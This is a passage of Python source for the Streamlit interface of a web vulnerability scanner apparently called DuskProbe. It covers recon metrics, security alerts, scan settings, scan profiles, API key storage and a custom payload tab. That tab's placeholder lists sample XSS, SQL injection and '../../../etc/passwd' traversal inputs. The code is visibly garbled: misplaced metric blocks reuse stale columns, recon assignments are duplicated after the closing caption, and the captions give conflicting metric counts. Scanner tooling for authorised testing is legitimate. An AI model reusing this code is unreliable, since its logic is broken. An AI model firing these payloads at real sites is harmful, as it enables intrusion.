                # Row 7: Metrics 31-35
                col1, col2, col3, col4, col5 = st.columns(5)
                with col1:
                    http2 = advanced_analysis.get('http2_support', False)
                    st.metric("[31] HTTP/2", "Yes" if http2 else "No")
                with col2:
                    ws = advanced_analysis.get('websocket_support', False)
                    st.metric("[32] WebSocket", "Yes" if ws else "No")
                with col3:
                    cdn_info = advanced_analysis.get('cdn_detection', {})
                    cdn = cdn_info.get('cdn_provider', 'None')
                    st.metric("[33] CDN", cdn[:15])
                with col4:
                    cloud_info = advanced_analysis.get('cloud_provider', {})
                    cloud = cloud_info.get('provider', 'Unknown')
                    st.metric("[34] Cloud", cloud[:15])
                with col5:
                    tokens = advanced_analysis.get('server_tokens', {})
                    server_name = tokens.get('server', 'Not disclosed')
                    st.metric("[35] Server", server_name[:18])
                
                # Row 8: Metrics 36-40
                col1, col2, col3, col4, col5 = st.columns(5)
                with col1:
                    powered_by = tokens.get('x_powered_by', 'Not disclosed')
                    st.metric("[36] Powered By", powered_by[:15])
                with col2:
                    compression = advanced_analysis.get('compression_methods', [])
                    comp_count = len(compression) if isinstance(compression, list) else 0
                    st.metric("[37] Compression", f"{comp_count} types" if comp_count > 0 else "None")
                with col3:
                    cache_conf = advanced_analysis.get('cache_config', {})
                    cache_ctrl = cache_conf.get('cache_control', 'Not set')
                    cache_status = "Yes" if cache_ctrl != 'Not set' else "No"
                    st.metric("[38] Cache", cache_status)
                with col4:
                    tls_cipher = advanced_analysis.get('tls_cipher_analysis', {})
                    cipher_name = tls_cipher.get('cipher_name', 'Unknown')
                    # Show shortened version
                    if cipher_name and cipher_name != 'Unknown' and len(cipher_name) > 20:
                        # Extract algorithm name (e.g., AES128-GCM from full name)
                        if 'AES' in cipher_name:
                            cipher_name = 'AES-' + cipher_name.split('AES')[1][:10]
                        elif 'CHACHA' in cipher_name:
                            cipher_name = 'ChaCha20'
                    st.metric("[39] TLS Cipher", cipher_name[:18] if cipher_name else "Unknown")
                with col5:
                    tls_protocol = tls_cipher.get('protocol_version', 'Unknown')
                    # Simplify protocol name (TLSv1.3 -> TLS 1.3)
                    if tls_protocol and tls_protocol.startswith('TLS'):
                        tls_protocol = tls_protocol.replace('v', ' ')
                    st.metric("[40] TLS Protocol", tls_protocol[:15] if tls_protocol else "Unknown")
                
                # Row 9: Metrics 41-45
                col1, col2, col3, col4, col5 = st.columns(5)
                with col1:
                    cipher_bits = tls_cipher.get('cipher_bits', 0)
                    st.metric("[41] Cipher Bits", f"{cipher_bits}b" if cipher_bits > 0 else "N/A")
                with col2:
                    cert_chain = advanced_analysis.get('certificate_chain', [])
                    chain_len = len(cert_chain) if isinstance(cert_chain, list) else 0
                    st.metric("[42] Cert Chain", f"{chain_len} certs" if chain_len > 0 else "N/A")
                with col3:
                    api_endpoints = advanced_analysis.get('api_endpoints', [])
                    api_count = len(api_endpoints) if isinstance(api_endpoints, list) else 0
                    st.metric("[43] API Endpoints", api_count)
                with col4:
                    email_sec = advanced_analysis.get('email_security', {})
                    dkim = email_sec.get('dkim', 'Not found')
                    dkim_status = "Yes" if dkim != 'Not found' else "No"
                    st.metric("[44] DKIM", dkim_status)
                with col5:
                    bimi = email_sec.get('bimi', 'Not configured')
                    bimi_status = "Yes" if bimi == 'Configured' else "No"
                    st.metric("[45] BIMI", bimi_status)
                
                # Row 10: Metrics 46-50
                col1, col2, col3, col4, col5 = st.columns(5)
                with col1:
                    csp = advanced_analysis.get('csp_analysis', {})
                    csp_configured = "Yes" if csp.get('configured') else "No"
                    st.metric("[46] CSP", csp_configured)
                with col2:
                    csp_unsafe = "Yes" if csp.get('unsafe_inline') or csp.get('unsafe_eval') else "No"
                    st.metric("[47] CSP Unsafe", csp_unsafe)
                with col3:
                    redirects = advanced_analysis.get('redirect_chain', [])
                    redirect_count = len(redirects) if isinstance(redirects, list) else 0
                    st.metric("[48] Redirects", redirect_count)
                with col4:
                    timing = advanced_analysis.get('timing_analysis', {})
                    initial_ms = timing.get('initial_response', 0)
                    st.metric("[49] Response Time", f"{initial_ms}ms" if initial_ms > 0 else "N/A")
                with col5:
                    fingerprint = advanced_analysis.get('http_fingerprint', 'N/A')
                    st.metric("[50] HTTP Fingerprint", fingerprint[:12] if fingerprint != 'N/A' else "N/A")
                
                st.markdown("---")
                with col4:
                    robots_status = robots.get('robots_txt', 'Not found')
                    st.metric("[29] Robots.txt", "Yes" if robots_status == 'Found' else "No")
                with col5:
                    sensitive = advanced_analysis.get('sensitive_files', {})
                    exposed_count = len(sensitive) if isinstance(sensitive, dict) and 'status' not in sensitive else 0
                    st.metric("[30] Exposed Files", exposed_count, delta="CRITICAL" if exposed_count > 0 else None)
                
                # === ALERTS SECTION ===
                st.markdown("---")
                alerts = []
                
                if isinstance(ssl_cert, dict):
                    if ssl_cert.get('is_expired'):
                        alerts.append("CRITICAL: SSL certificate expired")
                    elif isinstance(ssl_cert.get('days_until_expiry'), (int, float)) and ssl_cert['days_until_expiry'] <= 14:
                        alerts.append(f"WARNING: SSL expires in {ssl_cert['days_until_expiry']} days")
                
                if spf == 'Not configured':
                    alerts.append("WARNING: No SPF record - email spoofing risk")
                if dmarc == 'Not configured':
                    alerts.append("WARNING: No DMARC policy")
                
                if cors_origin == '*':
                    alerts.append("CRITICAL: CORS allows all origins")
                
                takeover = advanced_analysis.get('subdomain_takeover', [])
                if takeover and isinstance(takeover, list) and len(takeover) > 0:
                    if takeover[0] != 'No obvious risks detected':
                        alerts.append(f"WARNING: {len(takeover)} subdomain takeover risks")
                
                if exposed_count > 0:
                    alerts.append(f"CRITICAL: {exposed_count} sensitive files exposed")
                
                if missing >= 5:
                    alerts.append(f"HIGH: {missing} critical security headers missing")
                
                if len(subdomains) > 25:
                    alerts.append(f"INFO: Large attack surface - {len(subdomains)} subdomains")
                
                if alerts:
                    st.markdown("### Security Alerts")
                    for idx, alert in enumerate(alerts, 1):
                        if 'CRITICAL' in alert:
                            st.error(f"{idx}. {alert}")
                        elif 'WARNING' in alert or 'HIGH' in alert:
                            st.warning(f"{idx}. {alert}")
                        else:
                            st.info(f"{idx}. {alert}")
                else:
                    st.success("No critical security alerts detected")
                
                # === DETAILED DATA ===
                st.markdown("---")
                with st.expander("View Complete Reconnaissance Data"):
                    data_col1, data_col2 = st.columns(2)
                    
                    with data_col1:
                        st.markdown("**Infrastructure & Network**")
                        st.json({
                            'ipv4': ipv4,
                            'ipv6': ipv6,
                            'asn': ip_intel.get('asn') if isinstance(ip_intel, dict) else None,
                            'isp': ip_intel.get('isp') if isinstance(ip_intel, dict) else None,
                            'country': country,
                            'network_type': ip_intel.get('network_type') if isinstance(ip_intel, dict) else None
                        })
                        
                        st.markdown("**DNS Records**")
                        st.json(dns_records)
                        
                        st.markdown("**Technology Stack**")
                        st.json(technologies if isinstance(technologies, dict) else {})
                    
                    with data_col2:
                        st.markdown("**SSL/TLS Certificate**")
                        st.json(ssl_cert if isinstance(ssl_cert, dict) else {})
                        
                        st.markdown("**Security Configuration**")
                        st.json({
                            'headers': headers,
                            'cookies': cookies,
                            'cors': cors,
                            'http_methods': methods,
                            'open_ports': ports
                        })
                        
                        st.markdown("**Application Files**")
                        st.json({
                            'robots_txt': robots.get('robots_txt'),
                            'sitemap': robots.get('sitemap_xml'),
                            'security_txt': robots.get('security_txt'),
                            'sensitive_files': sensitive
                        })
                        
                        st.markdown("**Modern Analysis (HTTP/2, CDN, Cloud)**")
                        st.json({
                            'http2_support': advanced_analysis.get('http2_support'),
                            'websocket_support': advanced_analysis.get('websocket_support'),
                            'cdn_detection': advanced_analysis.get('cdn_detection'),
                            'cloud_provider': advanced_analysis.get('cloud_provider'),
                            'server_tokens': advanced_analysis.get('server_tokens'),
                            'compression_methods': advanced_analysis.get('compression_methods'),
                            'cache_config': advanced_analysis.get('cache_config'),
                            'tls_cipher_analysis': advanced_analysis.get('tls_cipher_analysis'),
                            'api_endpoints': advanced_analysis.get('api_endpoints'),
                            'email_security': advanced_analysis.get('email_security'),
                            'csp_analysis': advanced_analysis.get('csp_analysis'),
                            'redirect_chain': advanced_analysis.get('redirect_chain'),
                            'timing_analysis': advanced_analysis.get('timing_analysis'),
                            'http_fingerprint': advanced_analysis.get('http_fingerprint')
                        })
                
                if analytics and isinstance(analytics, dict) and len(analytics) > 0:
                    with st.expander("Analytics & Tracking IDs"):
                        for service, tracking_id in analytics.items():
                            st.code(f"{service}: {tracking_id}")
                
                if subdomains and len(subdomains) > 0:
                    with st.expander(f"Discovered Subdomains ({len(subdomains)})"):
                        for subdomain in subdomains:
                            st.code(subdomain)
                
                # Show API endpoints if found
                api_endpoints = advanced_analysis.get('api_endpoints', [])
                if api_endpoints and len(api_endpoints) > 0:
                    with st.expander(f"Discovered API Endpoints ({len(api_endpoints)})"):
                        for endpoint in api_endpoints:
                            st.code(endpoint)
                
                # Show redirect chain if exists
                redirect_chain = advanced_analysis.get('redirect_chain', [])
                if redirect_chain and len(redirect_chain) > 1:
                    with st.expander(f"Redirect Chain ({len(redirect_chain)} hops)"):
                        for idx, hop in enumerate(redirect_chain, 1):
                            st.code(f"{idx}. {hop.get('url', '')} → HTTP {hop.get('status', '')}")
                
                st.caption(f"Scan completed with 50+ verified metrics | Modern libraries: requests, BeautifulSoup, socket, hashlib")
                dns_records = advanced_recon.get('dns_records', {})
                ip_intel = advanced_recon.get('ip_intelligence', {})
                ssl_cert = advanced_recon.get('ssl_certificate', {})
                technologies = advanced_recon.get('technologies', {})
                subdomains = advanced_recon.get('subdomains', [])

                total_dns_records = sum(len(records) for records in dns_records.values() if isinstance(records, list))
                total_subdomains = len(subdomains)
                tech_counts = {
                    key.replace('_', ' ').title(): len(values)
                    for key, values in technologies.items()
                    if isinstance(values, list) and values
                }
                technology_total = sum(tech_counts.values())

                ssl_days_remaining = None
                if isinstance(ssl_cert, dict):
                    days_val = ssl_cert.get('days_until_expiry')
                    if isinstance(days_val, (int, float)):
                        ssl_days_remaining = int(days_val)

                st.markdown("### ⚡ Recon Snapshot")
                snap_col1, snap_col2, snap_col3, snap_col4 = st.columns(4)
                with snap_col1:
                    st.metric("DNS Records", total_dns_records)
                with snap_col2:
                    st.metric("Subdomains", total_subdomains)
                with snap_col3:
                    if ssl_days_remaining is not None:
                        st.metric("SSL Days Remaining", ssl_days_remaining)
                    else:
                        if isinstance(ssl_cert, dict):
                            ssl_state = "Expired" if ssl_cert.get('is_expired') else ssl_cert.get('not_after', 'Unknown')
                        else:
                            ssl_state = str(ssl_cert) if ssl_cert else "Unavailable"
                        st.metric("SSL Status", ssl_state or "N/A")
                with snap_col4:
                    st.metric("Tech Fingerprints", technology_total)

                # Exposure heuristics based on recon telemetry
                security_observations = []
                txt_records = dns_records.get('TXT', []) if isinstance(dns_records, dict) else []
                if isinstance(dns_records, dict) and not txt_records:
                    security_observations.append("🟡 No DNS TXT records detected — SPF/DMARC controls likely absent.")
                if isinstance(ssl_cert, dict):
                    if ssl_cert.get('is_expired'):
                        security_observations.append("🔴 SSL certificate is expired — renew immediately.")
                    elif ssl_days_remaining is not None and ssl_days_remaining <= 14:
                        security_observations.append(f"🟠 SSL certificate expires in {ssl_days_remaining} days.")
                if txt_records and not any('v=spf1' in str(record).lower() for record in txt_records):
                    security_observations.append("🟡 SPF record not detected — outbound email may be spoofable.")
                if txt_records and not any('v=dmarc1' in str(record).lower() for record in txt_records):
                    security_observations.append("🟡 DMARC policy missing — review mail authentication posture.")
                if isinstance(dns_records, dict) and not dns_records.get('MX'):
                    security_observations.append("ℹ️ MX records were not identified — domain may not handle email delivery.")
                if total_subdomains > 20:
                    security_observations.append(f"🟠 {total_subdomains} subdomains discovered — validate exposure scope.")
                if isinstance(ip_intel, dict) and ip_intel.get('network_type'):
                    network_type = ip_intel['network_type']
                    if 'hosting' in str(network_type).lower():
                        security_observations.append("🔍 Target appears to be on a hosting provider — confirm tenancy isolation.")

                if security_observations:
                    st.markdown("#### 🚨 Notable Exposure Signals")
                    for observation in security_observations:
                        st.write(f"- {observation}")
                else:
                    st.success("No immediate exposure signals detected from reconnaissance telemetry.")

                st.success("✅ Reconnaissance complete - 30 technical details mapped!")
            
            else:
                st.warning("⚠️ No advanced reconnaissance data available. The scan may not have completed the reconnaissance phase.")
        else:
            st.info("📭 No reconnaissance data available. Run a scan from the Scanner tab first.")
    
    # ========== TAB 5: ADVANCED CONFIGURATION (WITH API MANAGEMENT) ==========
    with tab5:
        st.subheader("⚙️ Configuration & Settings")
        
        config_tab1, config_tab2, config_tab3, config_tab4 = st.tabs(["🔧 General", "📋 Profiles", "🧪 Payloads", "🔑 API Management"])
        
        with config_tab1:
            st.markdown("### 🔧 General Configuration")
            
            st.markdown("---")
            st.markdown("**Performance Settings**")
            perf_col1, perf_col2, perf_col3 = st.columns(3)
            
            with perf_col1:
                new_max_threads = st.number_input(
                    "Max Threads",
                    min_value=1,
                    max_value=200,
                    value=st.session_state.advanced_config['max_threads'],
                    help="Number of concurrent requests"
                )
                new_timeout = st.number_input(
                    "Default Timeout (seconds)",
                    min_value=5,
                    max_value=600,
                    value=st.session_state.advanced_config['timeout'],
                    help="Request timeout"
                )
            
            with perf_col2:
                new_rate_limit = st.number_input(
                    "Rate Limit (req/s)",
                    min_value=1,
                    max_value=200,
                    value=st.session_state.advanced_config['rate_limit'],
                    help="Requests per second"
                )
                new_retry_attempts = st.number_input(
                    "Retry Attempts",
                    min_value=0,
                    max_value=20,
                    value=st.session_state.advanced_config['retry_attempts'],
                    help="Number of retry attempts on failure"
                )
            
            with perf_col3:
                new_scan_depth = st.number_input(
                    "Default Crawl Depth",
                    min_value=1,
                    max_value=50,
                    value=st.session_state.advanced_config['scan_depth'],
                    help="Maximum crawl depth"
                )
                new_follow_redirects = st.checkbox(
                    "Follow Redirects",
                    value=st.session_state.advanced_config['follow_redirects'],
                    help="Follow HTTP redirects",
                    key="config_follow_redirects"
                )
            
            if st.button("💾 Save Performance Settings"):
                st.session_state.advanced_config.update({
                    'max_threads': new_max_threads,
                    'timeout': new_timeout,
                    'rate_limit': new_rate_limit,
                    'retry_attempts': new_retry_attempts,
                    'scan_depth': new_scan_depth,
                    'follow_redirects': new_follow_redirects
                })
                st.success("✅ Performance settings saved!")
            
            st.markdown("---")
            st.markdown("**Security Settings**")
            sec_col1, sec_col2 = st.columns(2)
            
            with sec_col1:
                new_verify_ssl = st.checkbox(
                    "Verify SSL Certificates",
                    value=st.session_state.advanced_config['verify_ssl'],
                    help="Verify SSL/TLS certificates",
                    key="config_verify_ssl"
                )
                new_proxy_enabled = st.checkbox(
                    "Enable Proxy",
                    value=st.session_state.advanced_config['proxy_enabled'],
                    help="Use proxy server",
                    key="config_proxy_enabled"
                )
                if new_proxy_enabled:
                    new_proxy_url = st.text_input(
                        "Proxy URL",
                        value=st.session_state.advanced_config['proxy_url'],
                        placeholder="http://proxy:8080"
                    )
            
            with sec_col2:
                new_auth_type = st.selectbox(
                    "Default Authentication Type",
                    ["None", "Basic", "Bearer Token", "API Key"],
                    index=["None", "Basic", "Bearer Token", "API Key"].index(st.session_state.advanced_config['auth_type'])
                )
                
                st.markdown("**Custom User-Agents** (one per line)")
                user_agents_text = st.text_area(
                    "User Agents",
                    value='\n'.join(st.session_state.advanced_config['user_agents']) if st.session_state.advanced_config['user_agents'] else '',
                    placeholder="Mozilla/5.0...\nChrome/...",
                    height=100
                )
            
            if st.button("💾 Save Security Settings"):
                updates = {
                    'verify_ssl': new_verify_ssl,
                    'proxy_enabled': new_proxy_enabled,
                    'auth_type': new_auth_type,
                    'user_agents': [ua.strip() for ua in user_agents_text.split('\n') if ua.strip()]
                }
                if new_proxy_enabled:
                    updates['proxy_url'] = new_proxy_url if 'new_proxy_url' in locals() else st.session_state.advanced_config['proxy_url']
                
                st.session_state.advanced_config.update(updates)
                st.success("✅ Security settings saved!")
            
            st.markdown("---")
            st.markdown("**Custom Headers & Cookies**")
            headers_col1, headers_col2 = st.columns(2)
            
            with headers_col1:
                st.markdown("**Custom HTTP Headers** (JSON)")
                custom_headers_json = st.text_area(
                    "Headers",
                    value=json.dumps(st.session_state.advanced_config['custom_headers'], indent=2),
                    placeholder='{"X-Custom-Header": "value"}',
                    height=150
                )
            
            with headers_col2:
                st.markdown("**Cookies** (JSON)")
                cookies_json = st.text_area(
                    "Cookies",
                    value=json.dumps(st.session_state.advanced_config['cookies'], indent=2),
                    placeholder='{"session": "abc123", "token": "xyz789"}',
                    height=150
                )
            
            if st.button("💾 Save Headers & Cookies"):
                try:
                    new_headers = json.loads(custom_headers_json) if custom_headers_json.strip() else {}
                    new_cookies = json.loads(cookies_json) if cookies_json.strip() else {}
                    st.session_state.advanced_config['custom_headers'] = new_headers
                    st.session_state.advanced_config['cookies'] = new_cookies
                    st.success("✅ Headers and cookies saved!")
                except json.JSONDecodeError as e:
                    st.error(f"❌ Invalid JSON format: {str(e)}")
            
            st.markdown("---")
            if st.button("🔄 Reset All to Defaults"):
                st.session_state.advanced_config = {
                    'rate_limit': 10,
                    'retry_attempts': 3,
                    'custom_headers': {},
                    'auth_type': 'None',
                    'auth_credentials': {},
                    'proxy_enabled': False,
                    'proxy_url': '',
                    'user_agents': [],
                    'cookies': {},
                    'scan_depth': 3,
                    'follow_redirects': True,
                    'verify_ssl': True,
                    'timeout': 30,
                    'max_threads': 10
                }
                st.success("✅ Configuration reset to defaults!")
                st.rerun()
        
        with config_tab2:
            st.markdown("### 📋 Scan Profile Management")
            
            st.markdown("**Default Profiles:**")
            for profile_name, profile_config in st.session_state.scan_profiles.items():
                with st.expander(f"🔹 {profile_name}"):
                    st.json(profile_config)
                    if profile_name not in ['Quick Scan', 'Full Scan', 'OWASP Top 10', 'API Security']:
                        if st.button(f"🗑️ Delete {profile_name}", key=f"del_{profile_name}"):
                            del st.session_state.scan_profiles[profile_name]
                            st.success(f"✅ Profile '{profile_name}' deleted!")
                            st.rerun()
            
            st.markdown("---")
            st.markdown("**Create Custom Profile:**")
            
            custom_col1, custom_col2 = st.columns(2)
            with custom_col1:
                new_profile_name = st.text_input("Profile Name", placeholder="My Custom Profile")
                new_profile_crawl = st.checkbox("Enable Crawling", key="new_crawl")
                new_profile_verbose = st.checkbox("Verbose Mode", key="new_verbose")
            
            with custom_col2:
                new_profile_checks = st.multiselect(
                    "Vulnerability Checks",
                    ['xss', 'sqli', 'lfi', 'rfi', 'xxe', 'ssti', 'ssrf', 'idor', 'jwt', 'graphql', 'cors', 'nosqli', 'ldap', 'xpath', 'command', 'csrf', 'clickjacking'],
                    default=['xss', 'sqli']
                )
            
            if st.button("➕ Add Profile"):
                if new_profile_name:
                    st.session_state.scan_profiles[new_profile_name] = {
                        'crawl': new_profile_crawl,
                        'verbose': new_profile_verbose,
                        'checks': new_profile_checks
                    }
                    st.success(f"✅ Profile '{new_profile_name}' added successfully!")
                    st.rerun()
                else:
                    st.error("❌ Please provide a profile name")
            
            st.markdown("---")
            st.markdown("**Import/Export Profiles**")
            exp_col1, exp_col2 = st.columns(2)
            
            with exp_col1:
                profiles_json = json.dumps(st.session_state.scan_profiles, indent=2)
                st.download_button(
                    label="📥 Export Profiles (JSON)",
                    data=profiles_json,
                    file_name="duskprobe_profiles.json",
                    mime="application/json",
                    use_container_width=True
                )
            
            with exp_col2:
                uploaded_profiles = st.file_uploader("📤 Import Profiles (JSON)", type=['json'])
                if uploaded_profiles:
                    try:
                        imported_profiles = json.loads(uploaded_profiles.read().decode('utf-8'))
                        st.session_state.scan_profiles.update(imported_profiles)
                        st.success(f"✅ Imported {len(imported_profiles)} profiles!")
                        st.rerun()
                    except Exception as e:
                        st.error(f"❌ Failed to import: {str(e)}")
        
        with config_tab3:
            st.subheader("🧪 Custom Payload Management")
            
            st.info("""
            **Add custom payloads for vulnerability testing.**
            
            These will be used in addition to the default payloads during scans.
            Use with caution and only on authorized targets.
            """)
            
            payload_col1, payload_col2 = st.columns(2)
            
            with payload_col1:
                payload_type = st.selectbox(
                    "Payload Type",
                    ['xss', 'sqli', 'lfi', 'rfi', 'xxe', 'ssti', 'ssrf', 'command', 'nosqli', 'jwt', 'graphql', 'ldap', 'xpath', 'csrf']
                )
                
                payload_content = st.text_area(
                    "Payload Content (one per line)",
                    placeholder="<script>alert('XSS')</script>\n' OR '1'='1\n../../../etc/passwd",
                    height=200
                )
            
            with payload_col2:
                st.markdown("**Current Custom Payloads:**")
                if st.session_state.custom_payloads:
                    for ptype, payloads in st.session_state.custom_payloads.items():
                        st.markdown(f"**{ptype.upper()}:** {len(payloads)} payloads")
                        with st.expander(f"View {ptype.upper()} payloads"):
                            for idx, p in enumerate(payloads[:20], 1):  # Show first 20
                                st.code(f"{idx}. {p}", language='text')
                            if len(payloads) > 20:
                                st.info(f"... and {len(payloads) - 20} more payloads")
                else:
                    st.info("No custom payloads added yet")
                
                if st.button("🗑️ Clear All Payloads"):
                    st.session_state.custom_payloads = {}
                    st.rerun()
            
            if st.button("➕ Add Payloads"):
                if payload_content:
                    payloads = [p.strip() for p in payload_content.split('\n') if p.strip()]
                    if payload_type not in st.session_state.custom_payloads:
                        st.session_state.custom_payloads[payload_type] = []
                    st.session_state.custom_payloads[payload_type].extend(payloads)
                    st.success(f"✅ Added {len(payloads)} payloads for {payload_type.upper()}")
                    st.rerun()
                else:
                    st.error("❌ Please provide payload content")
            
            st.markdown("---")
            st.markdown("**Import/Export Payloads**")
            payload_exp_col1, payload_exp_col2 = st.columns(2)
            
            with payload_exp_col1:
                payloads_json = json.dumps(st.session_state.custom_payloads, indent=2)
                st.download_button(
                    label="📥 Export Payloads (JSON)",
                    data=payloads_json,
                    file_name="duskprobe_payloads.json",
                    mime="application/json",
                    use_container_width=True
                )
            
            with payload_exp_col2:
                uploaded_payloads = st.file_uploader("📤 Import Payloads (JSON)", type=['json'])
                if uploaded_payloads:
                    try:
                        imported_payloads = json.loads(uploaded_payloads.read().decode('utf-8'))
                        for ptype, plist in imported_payloads.items():
                            if ptype not in st.session_state.custom_payloads:
                                st.session_state.custom_payloads[ptype] = []
                            st.session_state.custom_payloads[ptype].extend(plist)
                        st.success(f"✅ Imported payloads successfully!")
                        st.rerun()
                    except Exception as e:
                        st.error(f"❌ Failed to import: {str(e)}")
        
        # ========== API MANAGEMENT (MOVED TO ADVANCED CONFIG) ==========
        with config_tab4:
            st.markdown("### 🔑 API Key Management & Integration")
            
            st.info("""
            **Configure optional API keys for OSINT and external security services.**

            DuskProbe runs fully offline by default. When you supply your own keys,
            we unlock richer threat intelligence, historical telemetry, and extended
            checks without storing or transmitting your credentials anywhere else.
            """)
        
        api_tab1, api_tab2 = st.tabs(["🔧 Configure APIs", "📊 API Status & Usage"])
        
        with api_tab1:
            st.markdown("### 🔧 API Configuration")
            
            # Shodan API
            st.markdown("---")
            st.markdown("#### 🔍 Shodan")
            shodan_col1, shodan_col2 = st.columns([2, 1])
            with shodan_col1:
                shodan_key = st.text_input(
                    "Shodan API Key",
                    value=st.session_state.api_keys['shodan'],
                    type="password",
                    placeholder="Enter your Shodan API key",
                    help="Get your key from https://account.shodan.io/"
                )
                st.markdown("**Features:** Server information, open ports, CVE data, SSL certificates")
            with shodan_col2:
                if SHODAN_AVAILABLE:
                    st.success("✅ Connected")
                else:
                    st.warning("⚠️ Not connected")
            
            # Censys API
            st.markdown("---")
            st.markdown("#### 🌐 Censys")
            censys_col1, censys_col2 = st.columns([2, 1])
            with censys_col1:
                censys_id = st.text_input(
                    "Censys API ID",
                    value=st.session_state.api_keys['censys_id'],
                    placeholder="Enter your Censys API ID",
                    help="Get your credentials from https://search.censys.io/account"
                )
                censys_secret = st.text_input(
                    "Censys API Secret",
                    value=st.session_state.api_keys['censys_secret'],
                    type="password",
                    placeholder="Enter your Censys API secret"
                )
                st.markdown("**Features:** Certificate data, host information, service fingerprinting")
            with censys_col2:
                if CENSYS_AVAILABLE:
                    st.success("✅ Connected")
                else:
                    st.warning("⚠️ Not connected")
            
            # URLScan.io API
            st.markdown("---")
            st.markdown("#### 🔗 URLScan.io")
            urlscan_col1, urlscan_col2 = st.columns([2, 1])
            with urlscan_col1:
                urlscan_key = st.text_input(
                    "URLScan.io API Key",
                    value=st.session_state.api_keys['urlscan'],
                    type="password",
                    placeholder="Enter your URLScan.io API key",
                    help="Get your key from https://urlscan.io/user/signup"
                )
                st.markdown("**Features:** Website scanning, screenshot capture, HTTP/DNS analysis")
            with urlscan_col2:
                if st.session_state.api_keys['urlscan']:
                    st.success("✅ Configured")
                else:
                    st.warning("⚠️ Not configured")
            
            # VirusTotal API
            st.markdown("---")
            st.markdown("#### 🛡️ VirusTotal")
            vt_col1, vt_col2 = st.columns([2, 1])
            with vt_col1:
                vt_key = st.text_input(
                    "VirusTotal API Key",
                    value=st.session_state.api_keys['virustotal'],
                    type="password",
                    placeholder="Enter your VirusTotal API key",
                    help="Get your key from https://www.virustotal.com/gui/my-apikey"
                )
                st.markdown("**Features:** URL/domain reputation, malware detection, threat intelligence")
            with vt_col2:
                if st.session_state.api_keys['virustotal']:
                    st.success("✅ Configured")
                else:
                    st.warning("⚠️ Not configured")
            
            # AlienVault OTX API
            st.markdown("---")
            st.markdown("#### 👽 AlienVault OTX")
            otx_col1, otx_col2 = st.columns([2, 1])
            with otx_col1:
                otx_key = st.text_input(
                    "AlienVault OTX API Key",
                    value=st.session_state.api_keys['alienvault'],
                    type="password",
                    placeholder="Enter your OTX API key",
                    help="Get your key from https://otx.alienvault.com/api"
                )
                st.markdown("**Features:** Threat intelligence, IOCs, pulse data, reputation scoring")
            with otx_col2:
                if st.session_state.api_keys['alienvault']:
                    st.success("✅ Configured")
                else:
                    st.warning("⚠️ Not configured")
            
            # Save button
            st.markdown("---")
            if st.button("💾 Save All API Keys", type="primary", use_container_width=True):
                st.session_state.api_keys.update({
                    'shodan': shodan_key,
                    'censys_id': censys_id,
                    'censys_secret': censys_secret,
                    'urlscan': urlscan_key,
                    'virustotal': vt_key,
                    'alienvault': otx_key
                })
                
                # Optionally save to .env file
                try:
                    env_content = f"""# DuskProbe API Keys - Generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

SHODAN_API_KEY={shodan_key}

CENSYS_API_ID={censys_id}
CENSYS_API_SECRET={censys_secret}

URLSCAN_API_KEY={urlscan_key}

VIRUSTOTAL_API_KEY={vt_key}

ALIENVAULT_OTX_KEY={otx_key}
"""
                    with open('.env', 'w') as f:
                        f.write(env_content)
                    st.success("✅ API keys saved successfully to session and .env file!")
                except Exception as e:
                    st.warning(f"✅ API keys saved to session. Could not write to .env: {str(e)}")
            
            if st.button("🗑️ Clear All API Keys"):
                st.session_state.api_keys = {
                    'shodan': '',
                    'censys_id': '',
                    'censys_secret': '',
                    'urlscan': '',
                    'virustotal': '',
                    'alienvault': ''
                }
                st.success("✅ All API keys cleared!")
                st.rerun()
        
        with api_tab2:
            st.markdown("### 📊 API Status & Usage Overview")
            
            # API Status Summary
            api_status_col1, api_status_col2, api_status_col3 = st.columns(3)
            
            configured_apis = sum(1 for key, value in st.session_state.api_keys.items() if value)
            total_apis = len(st.session_state.api_keys)
            
            with api_status_col1:
                st.metric("Configured APIs", f"{configured_apis}/{total_apis}")
            with api_status_col2:
                st.metric("Active Integrations", f"{sum([SHODAN_AVAILABLE, CENSYS_AVAILABLE])}/2")
            with api_status_col3:
                completion_pct = (configured_apis / total_apis * 100) if total_apis > 0 else 0
                st.metric("Setup Complete", f"{completion_pct:.0f}%")
            
            st.markdown("---")
            st.markdown("**API Status Details:**")
            
            # Create status table
            status_data = [
                ["Shodan", "✅ Active" if SHODAN_AVAILABLE else "⚠️ Inactive", "Server intelligence, ports, CVEs"],
                ["Censys", "✅ Active" if CENSYS_AVAILABLE else "⚠️ Inactive", "Certificates, host data"],
                ["URLScan.io", "✅ Configured" if st.session_state.api_keys['urlscan'] else "❌ Not configured", "Website scanning, screenshots"],
                ["VirusTotal", "✅ Configured" if st.session_state.api_keys['virustotal'] else "❌ Not configured", "Threat intelligence, malware"],
                ["AlienVault OTX", "✅ Configured" if st.session_state.api_keys['alienvault'] else "❌ Not configured", "IOCs, threat feeds"]
            ]
            
            status_df = pd.DataFrame(status_data, columns=['Service', 'Status', 'Capabilities'])
            st.dataframe(status_df, use_container_width=True, hide_index=True)
            
            st.markdown("---")
            st.markdown("**Integration Benefits:**")
            
            benefit_col1, benefit_col2 = st.columns(2)
            
            with benefit_col1:
                st.markdown("""
                **🔍 Enhanced Reconnaissance:**
                - Historical server data
                - Open port discovery
                - SSL/TLS certificate analysis
                - Technology fingerprinting
                - Subdomain enumeration
                """)
            
            with benefit_col2:
                st.markdown("""
                **🛡️ Threat Intelligence:**
                - Known vulnerabilities (CVEs)
                - Malware associations
                - IP/domain reputation
                - Threat actor tracking
                - IoC correlation
                """)
            
            st.markdown("---")
            st.info("""
            **💡 Pro Tip:** Configure all API keys for maximum scanning effectiveness. 
            Free tier accounts are available for most services. Check the Configure APIs tab for registration links.
            """)
    
    # ========== TAB 6: EXPORT & REPORTS (WITH ADVANCED VISUALIZATIONS) ==========
    with tab6:
        st.subheader("💾 Export & Visualizations")
        
        if st.session_state.current_results:
            results = st.session_state.current_results
            all_results = results['results']
            
            # Aggregate findings
            all_findings = []
            for result in all_results:
                if result and 'findings' in result:
                    all_findings.extend(result['findings'])
            
            st.success(f"📊 **{len(all_findings)}** findings available for export and visualization")
            
            # ========== ADVANCED VISUALIZATIONS ==========
            st.markdown("### 📊 Data Visualizations")
            
            viz_tab1, viz_tab2, viz_tab3, viz_tab4 = st.tabs(["📈 Severity Spectrum", "🎯 Radar Analysis", "🌍 Geographic Map", "📉 Timeline"])
            
            with viz_tab1:
                st.markdown("#### Severity Distribution Spectrum")
                
                # Calculate severity distribution
                severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
